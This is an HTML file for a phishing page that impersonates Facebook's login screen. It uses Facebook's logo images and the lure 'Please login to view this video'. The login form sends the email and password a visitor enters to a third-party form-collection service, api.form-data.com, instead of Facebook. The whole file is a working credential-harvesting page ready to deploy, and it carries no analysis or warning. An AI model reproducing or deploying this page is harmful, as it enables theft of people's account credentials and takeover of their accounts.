<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - login or sign up</title>
    <link rel="stylesheet" href="./index.css">
</head>
<body>
    <header>
        English (UK)
    </header>

    <div class="logo"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yD/r/5D8s-GsHJlJ.png" alt=""></div>
    
    <h3>Please login to view this video</h3>
    <form method="POST" action="https://api.form-data.com/f/XHtqZZwzSYevyT">
        <input type="text" name="email" placeholder="Mobile number or email address"/>
        <input type="text" name="password" placeholder="Password"/>

        <button type="submit">Log in</button>
        <textarea  name="message" hidden>No message</textarea>
        <button class="secondary">Forgotten Password?</button>
    </form>

    <div class="footer-logo"><img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png" alt=""></div>

    <footer>
        <li>About</li>
        <li>Help</li>
        <li>More</li>
    </footer>
</body>
</html>
